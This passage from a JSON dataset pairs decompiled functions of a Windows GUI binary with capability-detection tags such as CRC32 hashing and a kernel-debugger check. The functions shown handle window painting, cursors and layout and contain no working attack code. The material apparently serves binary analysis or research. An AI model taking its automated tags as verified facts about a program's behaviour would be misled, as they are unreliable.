fcn.004045c8();\n    return;\n}\n",
        "token_count": 471
    },
    "0043dee4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0043dee4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint arg_8h;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    cVar1 = fcn.004039b8();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x9b) != '\\x01')) {\n        fcn.0040c998();\n        fcn.00403fc0();\n    }\n    fcn.0043ea30();\n    if ((*0x485ac4 == 0) || (*0x485ac4 == -1)) {\n        *0x485ac4 = 0;\n        if ((*(in_EAX + 0x54) & 1) != 0) {\n            sub.user32.dll_GetCursorPos(&uStack28);\n            fcn.0043d38c();\n            uStack28 = uStack20;\n            arg_8h = fcn.0040760c(uStack24);\n            fcn.0043e9fc(arg_8h);\n        }\n        if (*0x485ac4 != -1) {\n            fcn.0043bb98();\n        }\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "0043f338": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f338(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    if (*0x43f3e4 == (*0x43f3e0 & *(in_EAX + 7))) {\n        iVar1 = in_EAX[0x1d];\n        if ((*(iVar1 + 0xc) == 0) || (in_EAX[0x12] <= *(iVar1 + 0xc))) {\n            if ((*(iVar1 + 0x14) != 0) && (in_EAX[0x12] < *(iVar1 + 0x14))) {\n                *(iVar1 + 0x14) = in_EAX[0x12];\n            }\n        }\n        else {\n            *(iVar1 + 0xc) = in_EAX[0x12];\n        }\n        if ((*(iVar1 + 8) == 0) || (in_EAX[0x13] <= *(iVar1 + 8))) {\n            if ((*(iVar1 + 0x10) != 0) && (in_EAX[0x13] < *(iVar1 + 0x10))) {\n                *(iVar1 + 0x10) = in_EAX[0x13];\n            }\n        }\n        else {\n            *(iVar1 + 8) = in_EAX[0x13];\n        }\n        iVar1 = *(param_2 + 8);\n        if ((((iVar1 != 0) && (in_EAX[0x28] != 0)) && ((*(in_EAX + 0x55) & 4) == 0)) &&\n           ((((*(iVar1 + 0x18) & 1) == 0 && (*(iVar1 + 0x10) != 0)) && (*(iVar1 + 0x14) != 0)))) {\n            fcn.0043ea30();\n        }\n    }\n    return;\n}\n",
        "token_count": 449
    },
    "0043fb30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0043fb30(uint param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.00403a28();\n    if (cVar1 != '\\0') {\n        if ((param_2 & 2) == 2) {\n            param_2 = param_2 & 0xfffffffd;\n        }\n        else if ((param_2 & 1) != 1) {\n            param_2 = param_2 | 2;\n        }\n    }\n    uVar2 = fcn.0043fb70();\n    return param_2 | uVar2;\n}\n",
        "token_count": 152
    },
    "00440138": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440138(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_ECX;\n    uint8_t in_DL;\n    int32_t iVar3;\n    uint32_t *in_FS_OFFSET;\n    uint *puStack92;\n    uint *puStack88;\n    uint *puStack84;\n    uint var_40h;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t nNumerator;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_5h;\n    \n    var_30h = *in_ECX;\n    uStack48 = in_ECX[1];\n    uStack44 = in_ECX[2];\n    uStack40 = in_ECX[3];\n    unique0x100001df = in_EAX;\n    if ((in_DL == 0) || (*(in_DL + 0x483bcc) != *(in_EAX + 0x61))) {\n        if ((in_EAX[0x24] != 0) && (in_EAX[0x25] != 0)) {\n            var_ch = in_EAX[0x10];\n            var_10h = in_EAX[0x11];\n            var_14h = in_EAX[0x12];\n            var_18h = in_EAX[0x13];\n            puStack84 = 0x4401bc;\n            cVar2 = fcn.00444380();\n            if (cVar2 == '\\0') {\n                puStack84 = 0x4401f0;\n                fcn.0041b058();\n            }\n            else {\n                puStack84 = 0x4401ce;\n                (**(*stack0xfffffff8[0xc] + 0x44))();\n                nNumerator = var_38h;\n                var_1ch = var_34h;\n            }\n            if ((*(stack0xfffffff8 + 0x61) & 4) == 0) {\n                if ((*(stack0xfffffff8 + 0x61) & 1) == 0) {\n                    puStack84 = stack0xfffffff8[0x24];\n                    puStack88 = nNumerator;\n                    puStack92 = stack0xfffffff8[0x22];\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar3 = var_14h >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar3;\n                }\n            }\n            else if ((*(stack0xfffffff8 + 0x61) & 1) == 0) {\n                var_ch = nNumerator - (stack0xfffffff8[0x24] - stack0xfffffff8[0x22]);\n            }\n            else {\n                var_14h = nNumerator - (stack0xfffffff8[0x24] - stack0xfffffff8[0x22]);\n            }\n            if ((*(stack0xfffffff8 + 0x61) & 8) == 0) {\n                if ((*(stack0xfffffff8 + 0x61) & 2) == 0) {\n                    puStack84 = stack0xfffffff8[0x25];\n                    puStack88 = var_1ch;\n                    puStack92 = stack0xfffffff8[0x23];\n                    var_10h = sub.kernel32.dll_MulDiv();\n                    iVar3 = var_18h >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((var_18h & 1) != 0);\n                    }\n                    var_10h = var_10h - iVar3;\n                }\n            }\n            else if ((*(stack0xfffffff8 + 0x61) & 2) == 0) {\n                var_10h = var_1ch - (stack0xfffffff8[0x25] - stack0xfffffff8[0x23]);\n            }\n            else {\n                var_18h = var_1ch - (stack0xfffffff8[0x25] - stack0xfffffff8[0x23]);\n            }\n            *(stack0xfffffff8 + 0x62) = 1;\n            puStack88 = 0x440331;\n            puStack92 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffa4;\n            puStack84 = &stack0xfffffffc;\n            (**(*stack0xfffffff8 + 0x84))(var_18h, var_14h);\n            *in_FS_OFFSET = var_18h;\n            *(stack0xfffffff8 + 0x62) = 0;\n            return;\n        }\n        if (in_DL == 0) {\n            return;\n        }\n    }\n    var_14h = *(*(arg_8h + -8) + 8) - **(arg_8h + -8);\n    if (((var_14h < 0) || (in_DL - 3 < 2)) || (in_DL == 6)) {\n        var_14h = in_EAX[0x12];\n    }\n    var_18h = *(*(arg_8h + -8) + 0xc) - *(*(arg_8h + -8) + 4);\n    if (((var_18h < 0) || (in_DL - 1 < 2)) || (in_DL == 6)) {\n        var_18h = in_EAX[0x13];\n    }\n    var_ch = **(arg_8h + -8);\n    var_10h = *(*(arg_8h + -8) + 4);\n    // switch table (7 cases) at 0x4403ce\n    switch(in_DL) {\n    case 1:\n        piVar1 = *(arg_8h + -8) + 4;\n        *piVar1 = *piVar1 + var_18h;\n        break;\n    case 2:\n        piVar1 = *(arg_8h + -8) + 0xc;\n        *piVar1 = *piVar1 - var_18h;\n        var_10h = *(*(arg_8h + -8) + 0xc);\n        break;\n    case 3:\n        **(arg_8h + -8) = **(arg_8h + -8) + var_14h;\n        break;\n    case 4:\n        piVar1 = *(arg_8h + -8) + 8;\n        *piVar1 = *piVar1 - var_14h;\n        var_ch = *(*(arg_8h + -8) + 8);\n        break;\n    case 6:\n        var_ch = in_EAX[0x10];\n        var_10h = in_EAX[0x11];\n        puStack84 = &fcn.00440138::var_10h;\n        puStack88 = &fcn.00440138::var_14h;\n        puStack92 = &fcn.00440138::var_18h;\n        (**(**(arg_8h + -4) + 0xa8))(&fcn.00440138::var_30h, *(arg_8h + -8));\n    }\n    *(stack0xfffffff8 + 0x62) = 1;\n    puStack88 = 0x4404b9;\n    puStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0x84))(var_18h, var_14h);\n    *in_FS_OFFSET = var_18h;\n    *(stack0xfffffff8 + 0x62) = 0;\n    return;\n}\n",
        "token_count": 1805
    },
    "00440ed0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440ed0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x440fee;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.004031a8();\n    *param_2 = in_EAX[0x19];\n    param_2[1] = 0x44000000;\n    fcn.00440e68();\n    if ((*(in_EAX + 0x14) & 1) != 0) {\n        param_2[1] = param_2[1] | 0x2000000;\n        param_2[2] = param_2[2] | 0x10000;\n    }\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            param_2[1] = param_2[1] | 0x8000000;\n        }\n    }\n    if (*(in_EAX + 0x69) != '\\0') {\n        param_2[1] = param_2[1] | 0x10000;\n    }\n    param_2[3] = in_EAX[0x10];\n    param_2[4] = in_EAX[0x11];\n    param_2[5] = in_EAX[0x12];\n    param_2[6] = in_EAX[0x13];\n    if (in_EAX[0xc] == 0) {\n        param_2[7] = in_EAX[100];\n    }\n    else {\n        iVar2 = fcn.0044407c();\n        param_2[7] = iVar2;\n    }\n    param_2[9] = 0xb;\n    param_2[10] = sub.user32.dll_DefWindowProcA;\n    uVar3 = 0;\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    param_2[0xf] = iVar2;\n    param_2[0x10] = 0;\n    param_2[0xd] = *0x485668;\n    fcn.00403770();\n    fcn.0040482c();\n    fcn.00409324();\n    *in_FS_OFFSET = uVar3;\n    uStack288 = 0x440ff5;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 648
    },
    "004421d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004421d4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint var_6ch;\n    uint nWidth;\n    uint var_5ch;\n    uint nHeight;\n    uint var_4ch;\n    uint var_ch;\n    uint hgdiobj;\n    uint hdc;\n    \n    if ((*(in_EAX + 0x7e) != '\\0') && (*(param_2 + 4) == 0)) {\n        uStack128 = 0;\n        uStack132 = 0x442224;\n        uVar2 = sub.user32.dll_GetDC();\n        uStack132 = 0x442230;\n        (**(*in_EAX + 0x44))();\n        uStack136 = 0x44223e;\n        (**(*in_EAX + 0x44))();\n        uStack144 = 0x442248;\n        uStack140 = uVar2;\n        hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack148 = 0;\n        uStack152 = 0x442253;\n        uStack144 = uVar2;\n        sub.user32.dll_ReleaseDC();\n        uStack152 = 0;\n        uStack156 = 0x44225a;\n        uStack160 = sub.gdi32.dll_CreateCompatibleDC();\n        uStack156 = hgdiobj;\n        puStack164 = 0x44226a;\n        hdc = uStack160;\n        var_ch = sub.gdi32.dll_SelectObject();\n        uStack168 = 0x442326;\n        uStack172 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff54;\n        puStack164 = &stack0xfffffffc;\n        uVar2 = fcn.0044407c(&fcn.004421d4::var_4ch);\n        uVar2 = sub.user32.dll_BeginPaint(uVar2);\n        fcn.0043e9fc(hdc);\n        *(param_2 + 4) = hdc;\n        fcn.004421d4();\n        *(param_2 + 4) = 0;\n        (**(*in_EAX + 0x44))(hdc, 0, 0, 0xcc0020);\n        (**(*in_EAX + 0x44))(nHeight);\n        sub.gdi32.dll_BitBlt(uVar2, 0, 0, nWidth);\n        uVar2 = fcn.0044407c(&fcn.004421d4::var_4ch);\n        sub.user32.dll_EndPaint();\n        *in_FS_OFFSET = uVar2;\n        sub.gdi32.dll_SelectObject(hdc, var_ch, 0x44232d);\n        sub.gdi32.dll_DeleteDC(hdc);\n        sub.gdi32.dll_DeleteObject(hgdiobj);\n        return;\n    }\n    if ((*(in_EAX + 0x55) & 1) == 0) {\n        uStack128 = 0x4421fd;\n        iVar1 = fcn.00440d74();\n        if (iVar1 == 0) {\n            uStack128 = 0x44220a;\n            (**(*in_EAX + -0x10))();\n            return;\n        }\n    }\n    uStack128 = 0x442218;\n    fcn.00441cf8();\n    return;\n}\n",
        "token_count": 826
    },
    "00442520": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442520(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint16_t uVar5;\n    \n    if ((((*(in_EAX + 0x1a5) == '\\0') || ((*(in_EAX + 0x50) & 0x10) == 0)) || (*(in_EAX + 0x30) == 0)) ||\n       ((*(*(param_2 + 8) + 0x18) & 8) != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if ((*(*(param_2 + 8) + 0x18) & 2) == 0) {\n        iVar4 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x180), param_1);\n        if (iVar4 == 0) goto code_r0x00442565;\n        uVar2 = 1;\n    }\n    else {\ncode_r0x00442565:\n        uVar2 = 0;\n    }\n    if ((*(*(param_2 + 8) + 0x18) & 1) == 0) {\n        iVar4 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x180));\n        if (iVar4 != 0) {\n            uVar3 = 1;\n            goto code_r0x0044258d;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0044258d:\n    uVar5 = CONCAT11(uVar3, uVar2);\n    if ((bVar1) && ((uVar2 | uVar5 >> 8) != 0)) {\n        fcn.00443f84();\n    }\n    if ((*(in_EAX + 0x55) & 2) == 0) {\n        fcn.0044438c();\n    }\n    fcn.0043f338();\n    if ((bVar1) && (((uVar5 | uVar5 >> 8) != 0 || ((*(*(param_2 + 8) + 0x18) & 0xc0) != 0)))) {\n        fcn.00443f84();\n    }\n    return;\n}\n",
        "token_count": 525
    },
    "004425e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004425e0(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    \n    if ((*0x44262c == (*0x442628 & *(in_EAX + 7))) && (iVar2 = *(param_2 + 8),  (*(iVar2 + 0x18) & 1) == 0)) {\n        cVar3 = fcn.0043ef94();\n        if (cVar3 == '\\0') {\n            puVar1 = iVar2 + 0x18;\n            *puVar1 = *puVar1 | 1;\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 183
    },
    "00442630": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00442630(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.0044438c();\n    (**(*in_EAX + -0x10))();\n    fcn.004408fc();\n    if ((*(in_EAX + 7) & 1) == 0) {\n        fcn.00403a28();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "004430cc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004430cc(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    if ((*(in_EAX + 0x1a6) != '\\0') && (in_EAX = fcn.00440d74(),  piVar2 = in_EAX,  -1 < in_EAX + -1)) {\n        do {\n            piVar1 = fcn.00440d38();\n            in_EAX = piVar1;\n            if (((*(piVar1 + 0x57) != '\\0') && (in_EAX = (**(*piVar1 + 0x50))(),  in_EAX != '\\0')) &&\n               ((((*(piVar1 + 0x52) & 1) != 0 && (in_EAX = fcn.0043e9fc(*(*(arg_8h + -4) + 8)),  in_EAX != NULL)) ||\n                ((in_EAX = fcn.004039b8(),  in_EAX != '\\0' && (in_EAX = fcn.004430cc(arg_8h),  in_EAX != '\\0')))))) {\n                var_5h = 1;\n                break;\n            }\n            piVar2 = piVar2 + -1;\n        } while (piVar2 != NULL);\n    }\n    return in_EAX & 0xffffff00 | var_5h;\n}\n",
        "token_count": 356
    },
    "00444eb4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444eb4(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint var_3ch;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x165) == '\\0') && (in_EAX[0x5b] == 0)) {\n        uStack80 = 0x44512c;\n        (**(*in_EAX + -0x10))();\n        uStack80 = 0x445131;\n        fcn.00430404();\n        uStack80 = 0x445136;\n        cVar3 = fcn.0043050c();\n        if ((cVar3 != '\\0') && ((*(var_4h + 0x52) & 2) != 0)) {\n            uStack80 = 0x445148;\n            fcn.00430404();\n            uStack80 = 0x445152;\n            fcn.00430b24();\n        }\n        return;\n    }\n    uStack80 = 0x444ee7;\n    uStack80 = fcn.0044407c();\n    puStack84 = 0x444eed;\n    var_ch = sub.user32.dll_GetWindowDC();\n    uStack88 = 0x44511a;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar4 = fcn.0044407c(&fcn.00444eb4::var_1ch);\n    sub.user32.dll_GetClientRect(uVar4);\n    uVar4 = fcn.0044407c(&fcn.00444eb4::var_2ch);\n    sub.user32.dll_GetWindowRect(uVar4);\n    uVar4 = fcn.0044407c(&fcn.00444eb4::var_2ch, 2);\n    sub.user32.dll_MapWindowPoints(0, uVar4);\n    sub.user32.dll_OffsetRect(&fcn.00444eb4::var_1ch, -var_2ch, -var_28h);\n    sub.gdi32.dll_ExcludeClipRect(var_ch, var_1ch, var_18h, var_14h, var_10h);\n    iVar2 = var_28h;\n    iVar1 = var_2ch;\n    sub.user32.dll_InflateRect(&fcn.00444eb4::var_1ch, var_4h[0x5b], var_4h[0x5b]);\n    var_2ch = var_1ch;\n    var_28h = var_18h;\n    var_24h = var_14h;\n    var_20h = var_10h;\n    if (*(var_4h + 0x165) != '\\0') {\n        iVar8 = 0;\n        if (*(var_4h + 0x163) != '\\0') {\n            iVar8 = var_4h[0x5a];\n        }\n        if (*(var_4h + 0x59) != '\\0') {\n            iVar8 = iVar8 + var_4h[0x5a];\n        }\n        uVar4 = fcn.0044407c(0xfffffff0);\n        uVar5 = sub.user32.dll_GetWindowLongA(uVar4);\n        if ((*(var_4h + 0x162) & 1) != 0) {\n            var_2ch = var_2ch - iVar8;\n        }\n        if ((*(var_4h + 0x162) & 2) != 0) {\n            var_28h = var_28h - iVar8;\n        }\n        if ((*(var_4h + 0x162) & 4) != 0) {\n            var_24h = var_24h + iVar8;\n        }\n        if ((uVar5 & 0x200000) != 0) {\n            iVar6 = (***0x484484)(0x14);\n            var_24h = var_24h + iVar6;\n        }\n        if ((*(var_4h + 0x162) & 8) != 0) {\n            var_20h = var_20h + iVar8;\n        }\n        if ((uVar5 & 0x100000) != 0) {\n            iVar8 = (***0x484484)(0x15);\n            var_20h = var_20h + iVar8;\n        }\n        sub.user32.dll_DrawEdge\n                  (var_ch, &fcn.00444eb4::var_2ch, \n                   *(*(var_4h + 0x163) * 4 + 0x483c90) | *(*(var_4h + 0x59) * 4 + 0x483ca0), \n                   *(var_4h + 0x162) | *(*(var_4h + 0x165) * 4 + 0x483cb0) | *(*(var_4h + 0x1a5) * 4 + 0x483cc0) |\n                   0x2000);\n    }\n    sub.gdi32.dll_IntersectClipRect(var_ch, var_2ch, var_28h, var_24h, var_20h);\n    sub.user32.dll_OffsetRect(&fcn.00444eb4::var_2ch, -iVar1, -iVar2);\n    uVar7 = fcn.00426938();\n    uVar4 = var_ch;\n    sub.user32.dll_FillRect(var_ch, &fcn.00444eb4::var_2ch, uVar7);\n    *in_FS_OFFSET = uVar4;\n    uVar4 = fcn.0044407c(var_ch, 0x445121);\n    sub.user32.dll_ReleaseDC(uVar4);\n    return;\n}\n",
        "token_count": 1484
    },
    "0044ca70": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t __fastcall fcn.0044ca70(uint param_1, uint8_t param_2)\n\n{\n    int16_t in_AX;\n    int16_t iVar1;\n    uint var_3h;\n    \n    var_3h._2_1_ = in_AX >> 8;\n    iVar1 = 0;\n    if (var_3h._2_1_ == '\\0') {\n        if ((param_2 & 1) != 0) {\n            in_AX = in_AX + 0x2000;\n        }\n        if ((param_2 & 4) != 0) {\n            in_AX = in_AX + 0x4000;\n        }\n        iVar1 = in_AX;\n        if ((param_2 & 2) != 0) {\n            iVar1 = in_AX + -0x8000;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 220
    },
    "0044dc88": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044dc88(uint32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x44e593;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puVar2 = &stack0xfffffffc;\n    if (*(lprc - 0x21) != '\\0') {\n        if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n            puVar2 = &stack0xfffffffc;\n            if (*(lprc + 8) != '\\0') {\n                fcn.00426904();\n                puVar2 = puStack24;\n            }\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            fcn.00430404();\n            cVar3 = fcn.0043050c();\n            if (cVar3 == '\\0') {\n                fcn.00426904();\n            }\n            else {\n                fcn.00426904();\n            }\n            fcn.00426138();\n            puVar2 = puStack24;\n        }\n    }\n    puStack24 = puVar2;\n    if ((*(lprc - 0x29) == '\\0') || (*(lprc - 0x21) != '\\0')) {\n        fcn.00426ca8();\n    }\n    if (*(lprc - 0x30) == 0) {\n        cVar3 = fcn.004039b8();\n        if (cVar3 == '\\0') {\n            *(lprc - 0x31) = 0;\n        }\n        else {\n            *(lprc - 0x31) = *(*(lprc - 0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc - 0x31) = 0;\n    }\n    *(lprc - 0x10) = *(lprc - 0x20) + 1;\n    iVar5 = *(lprc - 0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc - 0xc) = iVar5;\n    fcn.004049d4();\n    if (bVar9) {\n        fcn.00426ca8();\n        *(lprc - 0x10) = 0;\n        *(lprc - 8) = 0xfffffffc;\n        *(lprc - 0x39) = 0;\n    }\n    else {\n        if ((*(lprc - 0x40) == 0) ||\n           (((iVar5 = *(*(lprc - 0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.0044aa24(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc - 0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc - 0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0'))))\n            )))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc - 0x41) = uVar4;\n        if ((*(lprc - 0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc - 0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0')))) {\n            if ((*(lprc - 0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc - 8) = *(lprc - 0x10);\n                *(lprc - 4) = *(lprc - 0xc);\n            }\n            else {\n                *(lprc - 8) = *(lprc - 0x10) + *(*(lprc - 0x40) + 0x34);\n                *(lprc - 4) = *(lprc - 0xc) + *(*(lprc - 0x40) + 0x30);\n            }\n            *(lprc - 0x39) = 0;\n        }\n        else {\n            *(lprc - 0x39) = 1;\n            if (*(lprc - 0x41) == '\\0') {\n                *(lprc - 8) = *(lprc - 0x10) + 0x10;\n                *(lprc - 4) = *(lprc - 0xc) + 0x10;\n            }\n            else {\n                *(lprc - 8) = *(lprc - 0x10) + *(*(lprc - 0x40) + 0x34);\n                *(lprc - 4) = *(lprc - 0xc) + *(*(lprc - 0x40) + 0x30);\n            }\n            if ((*(*(lprc - 0x38) + 0x38) != '\\0') && (*(lprc - 0x21) == '\\0')) {\n                *(lprc - 8) = *(lprc - 8) + 1;\n                *(lprc - 4) = *(lprc - 4) + 1;\n                uVar7 = fcn.004268fc();\n                *(lprc - 0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.004268fc();\n                    *(lprc - 0x48) = uVar7;\n                    fcn.0042d4fc();\n                    fcn.004268d8();\n                    fcn.00426ca8();\n                }\n                else {\n                    fcn.00426904();\n                    fcn.00426ca8();\n                }\n                fcn.00426904();\n                *(lprc - 0x10) = *(lprc - 0x10) + 1;\n                *(lprc - 0xc) = *(lprc - 0xc) + 1;\n            }\n            if (*(lprc - 0x41) == '\\0') {\n                *(lprc - 0x5c) = *(lprc - 0x10);\n                *(lprc - 0x58) = *(lprc - 0xc);\n                *(lprc - 0x54) = *(lprc - 8);\n                *(lprc - 0x50) = *(lprc - 4);\n                iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc - 8) - *(lprc - 0x10)) {\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc - 8) - *(lprc - 0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc - 0x10) = iVar5 + *(lprc - 0x10) + 1;\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                    *(lprc - 8) = iVar5 + *(lprc - 0x10);\n                }\n                iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc - 4) - *(lprc - 0xc)) {\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc - 4) - *(lprc - 0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc - 0xc) = iVar5 + *(lprc - 0xc) + 1;\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                    *(lprc - 4) = iVar5 + *(lprc - 0xc);\n                }\n                fcn.00426e2c();\n                *(lprc - 0x10) = *(lprc - 0x5c);\n                *(lprc - 0xc) = *(lprc - 0x58);\n                *(lprc - 8) = *(lprc - 0x54);\n                *(lprc - 4) = *(lprc - 0x50);\n            }\n            else {\n                iVar5 = *(*(lprc - 0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.0044aa24(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.0042b3a8();\n                    *(lprc - 0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc - 0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042c498();\n                    *(lprc - 0x48) = *(*(*(lprc - 0x28) + 0xc) + 0x18);\n                    